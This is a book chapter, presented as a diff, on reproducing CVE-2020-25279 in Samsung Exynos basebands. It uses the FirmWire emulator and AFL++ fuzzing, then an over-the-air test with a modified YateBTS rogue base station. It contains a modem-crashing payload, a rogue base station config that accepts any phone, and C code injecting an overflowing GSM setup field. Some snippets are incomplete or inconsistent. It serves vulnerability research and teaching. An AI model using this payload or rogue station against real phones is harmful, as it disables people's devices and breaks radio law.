@@ -1,0 +1,593 @@
+   Real-Life Case Study: Samsung
+                Exynos Baseband
+In this chapter, we will explore the combination of emulation, fuzzing, and vulnerability exploitation
+and gather the information from the previous two chapters into one concrete case study on CVE-2020-
+25279. In this chapter, we will look at a vulnerability that was found in modern Samsung phones such
+as the Galaxy S10, which could take over the phone modem with a fake GSM call. We will go through
+the entire process with the help of FirmWire (https://firmwire.github.io/docs/index.
+html). Moreover, we will explain other methodologies that could help us find the same vulnerability
+and compare the advantages of emulation.
+The following topics will be covered in this chapter:
+
+   • A crash course on mobile phone architecture
+   • Setting up FirmWire for vulnerability validation
+
+A crash course on mobile phone architecture
+A mobile phone is a complex system that contains several processors, each of which is in charge of
+different, specialized tasks. The main one, comparable to a computer’s CPU, is the Application Processor
+(AP), which provides general-purpose system interfaces, interrupts, and support to execute applications.
+A phone includes various devices and sensors, such as Wi-Fi, NFC, Bluetooth radio, and GPS, which
+enable communication, geo-localization, and multimedia functions. In this chapter, we will focus on
+the Connection Processor (CP), which is responsible for managing cellular radio functions, data
+transfers, and connections. It handles call management, text messaging, and internet connections.
+The following figure depicts the series 4 Exynos processor from Samsung, with the CP (baseband)
+highlighted in red, which will be the focus of this chapter:
+116   Real-Life Case Study: Samsung Exynos Baseband
+
+                               Figure 7.1 – Samsung Exynos high-level schematics
+
+      Baseband
+      The details of the Baseband chip have been discussed at hardwear.io and Blackhat conferences
+      during the process of reverse engineering the platforms. A figure for this has been provided as a
+      good approximation:
+                                                          A crash course on mobile phone architecture   117
+
+  Figure 7.2 – Exploded version of CP – AP communication (based on the FirmWire team's descriptions)
+
+The preceding figure provides a concise overview of the communication process between the CP
+(located on the left) and the AP (located on the right). The AP operates on a Linux kernel and may
+run an operating system such as Android on top. This operating system comprises various programs
+and services that facilitate interaction with the CP:
+
+   • The Radio Interface Layer Daemon (RILD) is a program running on the AP that provides
+     an interface with the modem
+   • The CP Boot Daemon (CBD) loads the firmware image in the baseband processor
+   • The Remote File System (RFS) stores the modem configuration and provides access to the
+     Android filesystem from the modem
+
+The Samsung Baseband software, Shannon, runs on an ARM Cortex-R7 CPU (which was added to
+QEMU in the previous chapter). These processors are optimized for demanding real-time applications
+where time-sensitive tasks require extremely low latency. Similarly, other mobile vendors’ basebands,
+as well as communication systems such as Wi-Fi or Bluetooth, may also use ARM Cortex-R* processor
+families such as Cortex-R3.
+
+Baseband CPU family
+Given the fact that the ARM Cortex-R* architecture is widely used, in this subsection, we will detail
+some hardware features that are common to these processors. The most important features are depicted
+in the following figure:
+118   Real-Life Case Study: Samsung Exynos Baseband
+
+                                   Figure 7.3 – The ARM Cortex-R7 architecture
+
+      Despite being small and cost-effective, the CPU family is equipped with an 11-stage pipeline with
+      instruction prefetch and out-of-order execution. The execution of a program is divided into 11 stages,
+      as explained at https://en.wikipedia.org/wiki/Instruction_pipelining. In the
+      best case, a program can achieve an 11x speedup if the pipeline aligns correctly. Many instructions
+      can be executed simultaneously as they can be in different stages of the pipeline.
+      Usually, the operating system splits the main memory into regions, each of them programmed with
+      a base address, size, and permissions. The usual permissions are Read, Write, and Executable. Also,
+      in advanced CPUs, the ring division and privilege level are other permissions that may be available.
+      In ARM architectures, specific instructions such as MRC and MCR are available for these tasks.
+      The memory also includes a portion called tightly coupled memory (TCM), which is a high-speed
+                                                             A crash course on mobile phone architecture     119
+
+memory, and the memory protection unit (MPU) may also need to control this space. An example
+of a memory controller unit (MCU) setup, extracted from the Shannon firmware, can be seen here:
+  mpu_init(int drbar, int drsr, int dracr, int rgrn){
+       MCR   p15, 0, R3, C6, c2, 0; Write MPU Region Number Reg.
+       MCR   p15, 0, RO, C6, c1, 0; Write MPU Region Base Address Reg.
+       MCR   p15, 0, R1, C6, c1, 2; Write MPU Region Size and Enable
+  Reg.
+       MCR   p15, 0, R2, C6, c1, 4; Write MPU Region Access Control Reg.
+       BX    LR; Branch to Link Register
+  }
+
+For the sake of simplicity, we have enclosed the assembly instructions in a C function. However, it’s
+important to note that these instructions must be considered platform-specific and inlined as they
+interact with special registers such as the p15 coprocessor, which is used to configure memory-
+controlling units. These units are secondary controllers that handle specific functionality of the CPU,
+such as memory protection. A common example of a coprocessor used in many architectures is the
+floating-point unit (FPU), which enhances floating-point mathematical operations in CPUs. Despite
+the ARM Cortex-R7 allowing memory separation (privileged versus non-privileged) if we configure
+the MPU accordingly, many older Shannon implementations may not have implemented this. As a
+result, if an attacker achieves code execution in an older baseband, it is likely to execute in privileged
+mode. By reusing the preceding instructions, the MPU can be reprogrammed to change permissions as
+needed. Any special registers used to configure the MPU are called coprocessors and are also involved
+in other critical operations, such as booting.
+
+Application processor and baseband interface
+The Baseband processor in mobile phones is completely isolated and has its own RAM and operating
+system. However, it shares data with the AP through communication interfaces such as shared memory
+and a serial bus. Despite the physical separation among the chips, these interfaces can be exploited, and
+there have been instances where it has been proven possible to escalate from the Baseband processor
+to the AP and take over the entire phone.
+
+A talk with Shannon
+As previously mentioned, the ARM Cortex-R7 runs the Shannon operating system. Shannon is a closed
+source operating system, and while there is limited documentation available, practitioners, researchers,
+and academics have made efforts to document this platform and the software it runs (https://
+downloads.immunityinc.com/infiltrate2018-slidepacks/amat-cama-a-
+walk-with-shannon/presentation.pdf). In the previous chapter, we demonstrated how
+to obtain, extract, and load the firmware in off-the-shelf disassemblers. Despite being closed source,
+Shannon shares concepts and methodologies with other basebands, which serve as a baseline for
+understanding its key concepts. One of the main characteristics of Shannon is that it is a real-time
+operating system (RTOS), which guarantees a response to an event within a specified time constraint.
+120   Real-Life Case Study: Samsung Exynos Baseband
+
+         A Walk with Shannon
+         We wanted to give credit to Amat Cama by naming our section in a similar way to one
+         of his most influential talks on this topic: https://downloads.immunityinc.
+         com/infiltrate2018-slidepacks/amat-cama-a-walk-with-shannon/
+         presentation.pdf.
+
+      Shannon implements its basic functionality in the Platform Abstraction Layer (PAL), which includes
+      low-level capabilities such as memory and task synchronization and management. The PAL can be
+      considered a micro-kernel that includes a small version of libc. In the RTOS, processes are referred
+      to as tasks, and each task has its own address space and operates independently from other tasks.
+      Inter-process communication (IPC) is achieved through queues.
+      Like any other operating system, Shannon’s PAL implements a task scheduler that prioritizes task
+      execution based on Shannon’s RTOS constraints. Interrupt handling is also subject to priorities, where
+      network messages typically have higher priorities compared to housekeeping tasks for communication
+      protocol implementation. However, due to performance constraints, Shannon does not implement
+      non-executable stack or address space layout randomization, making stack-based overflow exploitation
+      possible if any vulnerable function exists.
+      Other features of the Cortex-R processor include static and dynamic branch prediction, cache memory,
+      TCM, and an FPU.
+
+      A note on GSM/3GPP/LTE protocol specifications
+      Telecommunication protocols have delicate implementation specifications, as defined by the official
+      documents from the International Telecommunication Union (ITU). In a talk titled A Walk
+      with Shannon, by Amat Cama in 2015, vulnerabilities in a version of Shannon were exposed. The
+      vulnerabilities in basebands arose due to the variable data length allowed in some messages, particularly
+      in the Tag-Length-Value (TLV) field format mentioned in the official documentation. TLV allows the
+      sender to decide the length of the field, and this length can be “arbitrarily” long. However, variable
+      length fields typically have a bounding due to the limited number of bits available to define the length.
+      For example, in an excerpt from the GSM Protocol Configuration options table, shown here, some
+      TLV fields are displayed:
+                                                           Setting up FirmWire for vulnerability validation   121
+
+  IEI   Information Element          Type/Reference          Presence           Format          Length
+ 2B     PDP address               Packet data protocol      O (optional) TLV               4-24
+                                  address 10.5.6.4                       (variable length)
+ 27     Protocol                  Protocol              O (optional) TLV               3-253
+        configuration options     configuration options              (variable length)
+                                  10.5.6.3
+ 24     Packet Flow Identifier    Packet                    O (optional) TLV               3
+                                  Flow Identifier                        (variable length)
+                                  10.5.6.11
+ 39     SM cause                  SM Cause 22               O (optional) TLV               3
+                                                                         (variable length)
+
+                        Table 7.1 – An example of the GSM protocol specification
+
+As you can see, the Length column specifies the size of the fields in octets (bytes). The largest field is
+27 (Protocol configuration options), which can range from 3 to 253 bytes. This limitation is imposed
+by the need to keep protocol messages as small as possible, as radio messages can be lost and may
+require retransmission. Considering the potential number of these fields in a specification that spans
+thousands of pages, it can be quite daunting.
+After this brief discussion on the GSM protocol specification and how to interpret it, we will now
+delve into the details of a CVE discovered by the FirmWire team in Samsung devices and explain
+its implications.
+
+Setting up FirmWire for vulnerability validation
+Now, we will proceed with setting up the harness for the FirmWire emulator, which emulates the
+CP (baseband processor) of a Samsung device. The setup instructions, as taken from the web page,
+are straightforward:
+  $ sudo apt-get -y install docker docker.io
+  $ git clone https://github.com/FirmWire/FirmWire.git
+  $ cd FirmWire
+
+  #fix for afl crash
+  $ sudo su
+  # this command must be run as root
+  $ echo core >/proc/sys/kernel/core_pattern
+  # we go out from the root command line
+  $ exit
+122   Real-Life Case Study: Samsung Exynos Baseband
+
+        $ git clone https://github.com/FirmWire/panda.git
+
+        # This will take some time
+        docker build -t firmwire .
+
+        # Now enter the docker with
+        docker run --rm -it -v $(pwd):/firmwire firmwire
+
+      The following command will start QEMU+Avatar2 with the Samsung Exynos baseband. It will also
+      directly download the modem binary:
+        # Within the container you can run the firmware like this
+        $ ./firmwire.py https://github.com/grant-h/ShannonFirmware/raw/master/
+        modem_files/CP_G973FXXU3ASG8_CP13372649_CL16487963_QB24948473_REV01_
+        user_low_ship.tar.md5.lz4
+
+      The system should boot, as shown here:
+
+                                         Figure 7.4 – FirmWire boot process
+
+      In Chapter 6, we discussed the basic modifications that can be made to get the firmware running. The
+      vulnerability we will explore in this chapter occurs during the Call Setup of a GSM (2G) Call, and it is
+      important to identify how it can be exploited. While we will be conducting all our testing within the
+      emulator, we will also provide some code to exploit the vulnerability over the air if you own a device
+      that supports it. This will allow you to understand the benefits of using an emulator instead of setting
+      up a realistic (barely legal) radio setup at home. The FirmWire emulator, similar to TriForceAFL for
+                                                       Setting up FirmWire for vulnerability validation   123
+
+x86 systems, adds a particular hypercall to the emulator to communicate with AFL++. Team FirmWire,
+as mentioned in Chapter 6, has decided to use Panda, which is a modified version of QEMU that
+offers additional features such as snapshot record/replay. Although their approach to QEMU and
+TCG modification is similar, they have included some extra features to speed up the fuzzing process,
+including shared memory fuzzing, persistent mode, in-parent TCG caching, and TCG chaining. All
+these modifications result in a significant performance boost for the emulator.
+For emulator hypercall handling, we must open the ./target/arm/translate.c file that is
+within the PANDA version that’s distributed with the FirmWire repository:
+  9514         case 0xf:
+   9515             /* swi */
+   9516             {target_ulong svc_imm = extract32(insn, 0, 24);
+   9517             if(svc_imm == 0x4c4641) {//LFA ascii string (AFL)
+   9518                 tmp = load_reg(s, 0);
+   9519                 tmp2 = load_reg(s, 1);
+   9520                 tmp3 = load_reg(s, 2);
+   9521                 gen_helper_aflCall32(tmp, cpu_env, tmp, tmp2,
+  tmp3);
+   9522                 tcg_temp_free_i32(tmp3);
+   9523                 tcg_temp_free_i32(tmp2);
+   9524                 store_reg(s, 0, tmp);
+   9525             } else {
+   9526                 gen_set_pc_im(s, s->pc);
+   9527                 gen_set_pc_im(s, s->pc);
+   9528                 s->svc_imm = extract32(insn, 0, 24);
+   9529                 s->is_jmp = DISAS_SWI;
+   9530             }
+
+In the modkit/shannon directory of the FirmWire repository, we find some interesting code in
+afl.c, where the baseband emulator calls the fuzzer through a hypercall using the svc instruction.
+This instruction is a fake system call, as we have seen in previous approaches, that allows QEMU to
+stop, start a vanilla snapshot, and feed new input.
+The aflCall() function shows the call to the system service – that is, 0x3f (line 30). The code
+executes within the modem and is carefully injected as a modem task by FirmWire, remembering
+that the modem is closed source. This is for firmware hypercall handling:
+  21 static inline unsigned int aflCall(unsigned int a0, unsigned int
+  a1, unsigned int a2)
+   22 {
+   24     unsigned int ret;
+   25     register long r0 asm ("r0") = a0;
+   26     register long r1 asm ("r1") = a1;
+   27     register long r2 asm ("r2") = a2;
+124   Real-Life Case Study: Samsung Exynos Baseband
+
+         29     //asm(".word 0x0f4c4641" FLA string (AFL)
+         30     asm volatile("svc 0x3f" //.byte 0x3f, 0xdf" // 0x0f4c4641"
+         31             : "=r"(r0)
+         32             : "r"(r0), "r"(r1), "r"(r2)
+         33             );
+        …
+
+      Now that we have some knowledge about the fuzzer and how to start the modem, we will dive deep
+      into the execution of the emulator and find vulnerabilities.
+
+      CVE-2020-25279 – emulator fuzzing
+      So, how could we crash a phone baseband without actually having to read the GSM specification
+      beforehand to craft a deadly call packet? It’s simple. We start by emulating the modem with QEMU,
+      craft fake call setup messages (which we’ll look at here) with our fuzzer, and then sit down and wait
+      for crashes.
+      It’s important to note that Team FirmWire told us they started with completely random input. However,
+      if we start with a legitimate call setup message, we can potentially reduce the time it takes to find a
+      mutation that causes the modem to crash.
+      FirmWire already offers a harness to call AFL++ from within the modem code, by re-injecting specific
+      tasks (such as gsm_cc) with a small modification. You can find the details in the modkit directory
+      of the FirmWire repository. For now, just type make within the FirmWire modkit directory to build
+      the new AFL tasks to be injected. Create an input directory with mkdir fuzz_input and use our
+      call setup message as the initial fuzzing seed.
+      Here’s a recap of the GSM call setup procedure:
+
+        1.   The mobile station (phone) initiates a call by sending an “alert” message to the base station
+             (BS). This message includes the telephone number of the called party.
+        2.   The BS sends the alerting message to the mobile switching center (MSC), to reach the
+             counterpart and route the call.
+        3.   If the called party is available and the routing is correct, the MSC sends a “call proceeding”
+             message to the BS, which then sends an acknowledgment to the phone.
+        4.   The MSC then sends a “setup” message to the BS, which includes the telephone number of the
+             called party.
+        5.   The BS sends the setup message to the phone, which then sends an acknowledgment to the BS.
+        6.   At this point, the call is considered to be “connected,” and the phone and the called party can
+             begin talking.
+
+      As you may have guessed, this abnormal setup is sent from the base station to the phone.
+                                                            Setting up FirmWire for vulnerability validation    125
+
+The following is a small script that generates the buffer for the call setup. We will use this script to
+create our first input for the fuzzer. Phone numbers are encoded in binary coded decimal (BCD)
+format, where 0x30 is equivalent to 0 in decimal, similar to ASCII encoding:
+  $  # create the folder with the input for fuzzing
+  $  mkdir fuzz_input
+  $  # now create the file with the input
+  $ python3 -c 'import binascii; print(binascii.
+  unhexlify("3030303030303030303030303030303030300B040
+  3339001214365C2870A0033").decode("latin-1"))' > fuzz_input/call_setup
+
+Now, let’s understand each of the parts from the byte stream that we previously dumped into a file.
+If you get lost in some of the terms, we suggest reading about how a call is established between two
+mobiles, as mentioned in the preceding bullet points:
+
+   • 3030303030303030: Called party BCD number
+   • 3030303030303030: Calling party BCD number
+   • 0B: Length of the bearer capability field
+   • 04: Bearer capability, indicating that this is a call setup message
+   • 0333: Audio bearer capability, indicating speech
+   • 9001: Radio channel requirement, indicating a full rate traffic channel
+   • 214365C287: Called party number in IA5 (ASCII) format – in this case, 214365
+   • 0A: Length of the called party subaddress field
+   • 0033: Called party subaddress type, indicating that this is an extension of the called party number
+   • 33: Extension of the called party number – in this case, 3
+
+Before starting the fuzzer, to enhance its performance, we will start the emulator and take a handy snapshot:
+  python3 -u ./firmwire.py https://github.com/grant-h/ShannonFirmware/
+  raw/master/modem_files/CP_G973FXXU3ASG8_CP13372649_CL16487963_
+  QB24948473_REV01_user_low_ship.tar.md5.lz4
+
+Now, let’s wait to see a message like the one where we highlighted the address in the following figure
+and extracted the text:
+  [66.xxxx][BTL] pal_SmSetEven+0x9e1 (0x4054df83) 0b10: [.......]
+126   Real-Life Case Study: Samsung Exynos Baseband
+
+             Figure 7.5 – Finding a good place for a snapshot (addresses are consistent across reboots)
+
+      In this case, the address, 0x4054df83, will serve as the snapshot address. If needed, repeat the
+      following command to address any potential locking issues. Once you’ve found the snapshot address,
+      press Ctrl + C and relaunch FirmWire with the following command-line options:
+        # create snapshot, with fuzztask injected
+        $ python3 -u ./firmwire.py --snapshot-at 0x4054df83,gsm_fuzz_base
+        --fuzz-triage gsm_cc --fuzz-input ./fuzz_input/ ./CP_G973FXXU3ASG8_
+        CP13372649_CL16487963_QB24948473_REV01_user_low_ship.tar.md5.lz4
+
+      As you can see, we are providing new command-line options to the firmwire.py program. We
+      tell it to take a snapshot called gsm_fuzz_base at the 0x4054df83 address while we triage the
+      gsm_cc (call control) task of the firmware. If you don’t see Snapshot completed! as the output,
+      please try again using the instructions provided here:
+                                                         Setting up FirmWire for vulnerability validation   127
+
+                               Figure 7.6 – Successful snapshot creation
+
+If you receive an error similar to the following, which is related to the gsm_cc binary, it may be due
+to some locking issue:
+
+                                      Figure 7.7 – Error message
+
+In such cases, you can try again several times until it works.
+128   Real-Life Case Study: Samsung Exynos Baseband
+
+      You can compile the binary using the following commands:
+        $ cd modkit/
+        $ make
+        $ # return to previous folder
+        $ cd ..
+        $ python3 -u ./firmwire.py --snapshot-at 0x4054e641,gsm_fuzz_base
+        --fuzz-triage gsm_cc --fuzz-input ./fuzz_input ./CP_G973FXXU3ASG8_
+        CP13372649_CL16487963_QB24948473_REV01_user_low_ship.tar.md5.lz4
+
+      Now, within Docker, we can start our fuzzer, AFL++, with a sample call and wait for a crash. Docker
+      does not contain AFL++, so quickly clone the repository and build it, then start the fuzzer:
+        root@$~: git clone https://github.com/AFLplusplus/AFLplusplus.git
+        cd AFLplusplus && make && make install && cd ../firmwire
+
+        AFL_NO_UI=1 AFL_FORKSRV_INIT_TMOUT=100000 \
+        timeout 86400 afl-fuzz \
+        -i fuzz_input  -o out -t 10000 -m none -M "main" -U -- ./firmwire.
+        py --fuzz gsm_cc --fuzz-input @@ ./CP_G973FXXU3ASG8_CP13372649_
+        CL16487963_QB24948473_REV01_user_low_ship.tar.md5.lz4
+
+      For reference, the output is as follows:
+
+                         Figure 7.8 – Executing the fuzzer with a standard call as seed input
+                                                         Setting up FirmWire for vulnerability validation   129
+
+Now, as you may imagine, our fuzzer will eventually generate some crashing input using the hexadecimal
+representation of a basic call setup message from the BST. We know that some crashing input will be
+found if a vulnerable modem binary is being used. Additionally, thanks to team FirmWire, we have
+a binary payload that can crash the modem immediately. This payload can be generated with the
+following Python one-liner:
+  python -c 'print("".join(["30"]*16 + ["80", "04", "0533"] + ["30"]*68
+  + ["30"]))' > crasher.bin
+
+The preceding payload can be explained as follows:
+
+   • 3030303030303030: Called party BCD number
+   • 3030303030303030: Calling party BCD number
+   • 80: Length of the bearer capability field (in bytes) (this overflows; before, it was 0B)
+   • 04: Bearer capability, indicating that this is a call setup message
+   • 0533: Audio bearer capability, indicating speech
+   • 30303030303030303030303030303030303030303030303030303030303030
+     30: 68 bytes of reserved data, all set to 0
+   • 30303030: End of message indicator
+
+The preceding payload was found by team FirmWire in 2020 and presented at BlackHat. Slide 53 of
+the presentation (https://i.blackhat.com/USA-20/Wednesday/us-20-Hernandez-
+Emulating-Samsungs-Baseband-For-Security-Testing.pdf) contains the preceding
+payload. As a rigorous exercise, we are going to double-check that the crash that was found also
+works on a real phone. Thanks to the B.Sc work of Ádrian Hacar Sobrino, we set up a small GSM
+network and modified YateBTS to obtain a similar result without knowing about the existence of this
+payload. This was done by digging through the specification of the GSM protocol and by knowing
+the CVE description.
+
+CVE-2020-25279 – OTA exploitation
+Multiple devices and software are needed to perform tests and exploits. First of all, we need to set up
+a base station with YateBTS, which requires a BladeRF, a software-defined radio (https://www.
+nuand.com/bladerf-1/). BladeRF is a type of software-defined radio that is used in setting up
+a base station with YateBTS, a software solution for building GSM networks:
+130   Real-Life Case Study: Samsung Exynos Baseband
+
+         Figure 7.9 – Setting up the B.Sc thesis of Adrian Hacar Sobrino – see the Faraday bag at the back left
+
+      Once you’ve calibrated the RF circuits of your SDR, if you use the Nuand brand, the website will
+      provide you with calibration data; then, you should be able to set up YateBTS.
+      After calibrating the RF circuits of your SDR, using the Nuand brand, the website will provide you
+      with calibration data. Once you have this data, you can set up YateBTS. Here are the commands to
+      install the required dependencies and software:
+        $ sudo apt-get install git apache2 php5 bladerf libbladerf-dev
+        libbladerf0 automake
+
+        $ git clone https://github.com/ctxis/yate-bts
+
+        $./autogen.sh && ./configure --prefix=/usr/local && sudo make clean &&
+        make && sudo make install && sudo ldconfig
+                                                        Setting up FirmWire for vulnerability validation   131
+
+First, let’s configure YateBTS according to the country your SIM card is in. Open the /usr/local/
+etc/yate/ybts.conf file and set the following values. You can go to https://www.mcc-mnc.
+com/ to find something appropriate:
+  Radio.Band=900
+  Radio.C0=1000
+  Identity.MCC=YOUR_COUNTRY_MCC
+  Identity.MNC=YOUR_OPERATOR_MNC
+  Identity.ShortName=MyEvilBTS
+  Radio.PowerManager.MaxAttenDB=35
+  Radio.PowerManager.MinAttenDB=35
+
+You can find valid MCC and MNC values here.
+Now, edit the /usr/local/etc/yate/subscribers.conf file, as follows:
+  country_code=YOUR_CONTRY_CODE
+  regexp=.*
+
+   Warning
+   Using the .* regular expression will make every GSM phone in your area connect to your BTS.
+   Though recent mobile phones prefer other lines such as 3G/4G/5G, we encourage you not to
+   break the law and use some Faraday bags.
+
+The following are some example values for MCC and MNC:
+  Identity.MCC 007
+  Identity.MNC 06
+  country_code=ES #ISO country code
+
+   Disclaimer
+   Emitting a radio signal on licensed and legally protected frequencies may be illegal in your
+   country, so please get some Faraday bags, such as Blackout (https://www.amazon.
+   com/Faraday-BLACKOUT%C2%AE-Premium-Prepping-Smartphones/dp/
+   B01BCV7JMW). Get some specific GSM antennas that are very small in size (approximately
+   3cm) so that everything will fit perfectly into a big Blackout bag, including the phone. If you
+   check Ádrian’s setup (Figure 7.9), one bag is just on the side of the screen, and it’s very big.
+
+Yate also has a web interface that can be handy for changing and refining some parameters – that
+is, accepting only the IMSI of your phone’s SIM (http://YOURIPADDRESS/nipc/main.
+php?module=bts_configuration).
+132   Real-Life Case Study: Samsung Exynos Baseband
+
+      Now, it’s time to start Yate:
+
+        1.   Start YateBTS, our own GSM base station:
+                 $ yate -sd -vvvvv -l ~/logs/log_yatebts.txt -Dz
+
+             Since we are accepting any mobile phone and our test phone will be the closest and the only
+             one that can be seen within the Faraday bag, let’s use a trick to find the phone number that
+             the BTS assigned us.
+        2.   Find your phone number:
+                 $ cat ~/logs/log_yatebts.txt | grep "Registered imsi"
+
+             The expected output is as follows:
+                 <nipc:INFO> Registered imsi 234304161285164 with number
+                 9723458xxx
+
+             Now that we know our phone SIM calling number, we can make a test call using Telnet and Yate.
+             If you are curious, you can also capture the traffic with tcpdump. Remember to enable GSM
+             tap through the web interface.
+        3.   Save the traffic with tcpdump:
+                 $ sudo tcpdump -i any udp port 4729 -w ./call_yate.pcap
+
+        4.   Perform a call through telnet:
+                 telnet localhost 5038
+                 callgen set called=9723458xxx
+                 callgen single
+                                                          Setting up FirmWire for vulnerability validation   133
+
+      The following figure is a reference for the call:
+
+                                       Figure 7.10 – Example call
+
+ 5.   Next, send some exploit code. First, let’s kill whatever related to YateBTS is executing and
+      modify some code according to the vulnerability we found:
+         $ killall yate
+
+         $ cd ~/software/null/yate
+
+Now, let’s intercept and change the setup message. Edit the mbts/GSM/GSML2LAPDm.cpp file
+and find the following function:
+ void L2LAPDm::writeHighSide(const L3Frame& frame),
+134   Real-Life Case Study: Samsung Exynos Baseband
+
+      Here, the frame variable must be modified according to your exploit code. As an example, you could
+      create a local buffer and send the current frame and the buffer to a sibling function to inspect if the
+      message is a setup one:
+        unsigned char frame_data[0x600];
+        unsigned int frame_size;
+        L3Frame frame_new;
+
+        memset(frame_data, 0, 0x600);
+
+        frame_new = frame;
+
+        frame.pack(frame_data); // Deep copy the frame data into frame_data
+        with the pack function
+        frame_size = frame.size() / 8; //get len in bytes of the current frame
+
+        OTAintercept(frame_new, frame_data);
+
+      Now, our OTAintercept function will have two parameters as input: an L3Frame& frame
+      reference and an unsigned char* frame_data copy that contains the original data that
+      we copied over with the frame.pack(frame_data) call. A very simple check, done with a
+      conditional if statement, will tell us if the buffer contains the Call Control directive; otherwise, we
+      will discard the buffer:
+        if ((frame_data[1] & 0x3f) == 5) { //CC: setup call
+
+      If the conditional is true, we will enter the branch and alter the buffer. To inject our exploit code, an
+      example of the anomalous setup message would be as follows (beware that the following code is going
+      to crash your phone’s modem):
+        int BoF=      //154 Bytes
+
+        frame_data[2]=0x04; //IEI BEARER CAPABILITY 1
+        frame_data[3]=BoF; //LENGTH
+
+        memset(&buf[4], 0x07, BoF);
+        size=4+overflow;
+        memcpy(new_buf ,buf, size);
+
+      The explanation of the payload is as follows:
+
+         • 9696969696969696: Called party BCD number
+         • 9696969696969696: Calling party BCD number
+         • 96: Length of the bearer capability field (in bytes) (this overflows; before, it was 0B)
+                                                                                               Summary      135
+
+   • 04: Bearer capability, indicating that this is a call setup message
+   • 0533: Audio bearer capability, indicating speech
+   • 96969696969696969696969696969696969696969696969696969696969696
+     96: 68 bytes of reserved data, all set to 0
+   • 96969696: End of message indicator
+
+The following are the commands to set up and configure YateBTS with the necessary dependencies
+and software:
+  $ ./autogen.sh && ./configure --prefix=/usr/local && sudo make clean
+  && make && sudo make install && sudo ldconfig
+
+  $ yate -sd -vvvvv -l ~/logs/log_yatebts.txt -Dz
+
+Now, if we attempt to make a call through telnet again, as described in step 4, the baseband should
+crash if it has not been patched. However, it’s important to note that intentionally sending dangerous
+radio messages can be harmful and illegal. While this section explained how to crash a phone baseband
+via OTA, it may seem cryptic on purpose to avoid promoting illegal activities. It’s worth mentioning
+that this topic is not within the scope of this book. Nevertheless, it serves as a necessary reference to
+understand how we can leverage fuzzing and emulation techniques to achieve similar results without
+violating any radio protection laws. This discovery was made by Ádrian Hacar Sobrino during his final
+B.Sc thesis, and it validates the findings of the FirmWire team in an independent manner.
+This chapter has been extremely demanding because many low-level concepts were introduced and
+we have seen how difficult it could be to validate a crash on a realistic setup. Now, let’s summarize
+this chapter.
+
+Summary
+In this chapter, we looked at a real-world vulnerability, which we believe is CVE-2020-25279,
+though we have no confirmation that it has been patched in recent phones. As you can see from
+Ádrian’s video, his C code makes the baseband crash: https://twitter.com/adrihacar/
+status/1412383100580122625. To conclude, we understood some internals of the GSM
+protocol, its implementation within Samsung devices, and how the community is trying to help
+vulnerability research thanks to emulators and fuzzers.
+In the next chapter, we are going to change the topic and fuzz an awesome project called OpenWRT,
+a Linux-based, compatible router firmware. Special thanks to Marius Muench and team FirmWire
+for their support in writing this chapter.
